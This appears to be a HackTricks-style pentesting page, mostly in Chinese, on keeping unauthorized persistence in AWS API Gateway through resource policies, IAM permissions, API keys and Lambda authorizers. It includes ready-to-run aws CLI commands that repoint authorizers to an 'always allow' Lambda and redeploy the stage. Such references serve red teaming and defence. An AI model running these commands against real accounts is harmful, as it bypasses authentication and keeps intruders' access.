# AWS - API Gateway Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## API Gateway

更多信息请见：

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### 资源策略

修改 API gateway(s) 的资源策略，以授予自己对它们的访问权限

### 修改 Lambda Authorizers

修改 lambda authorizers 的代码，以授予自己对所有 endpoints 的访问权限。\ 或者直接移除 authorizer 的使用。

如果你拥有控制平面权限来 **create/update an authorizer** (REST API: `aws apigateway update-authorizer`, HTTP API: `aws apigatewayv2 update-authorizer`)，你也可以 **repoint the authorizer to a Lambda that always allows**。

REST APIs（更改通常需要部署）：
```bash
REGION="us-east-1"
REST_API_ID="<rest_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigateway update-authorizer --region "$REGION" --rest-api-id "$REST_API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
aws apigateway create-deployment --region "$REGION" --rest-api-id "$REST_API_ID" --stage-name "<stage>"
```
HTTP APIs / `apigatewayv2` (通常立即生效):
```bash
REGION="us-east-1"
API_ID="<http_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigatewayv2 update-authorizer --region "$REGION" --api-id "$API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
```
### IAM 权限

如果一个资源使用 IAM authorizer，你可以通过修改 IAM 权限来为自己授予访问权限。\
或者直接移除 authorizer 的使用。

### API Keys

如果使用 API keys，你可以 leak 它们以维持持久性，甚至创建新的 API keys。\
或者直接移除 API keys 的使用。

{{#include ../../../../banners/hacktricks-training.md}}
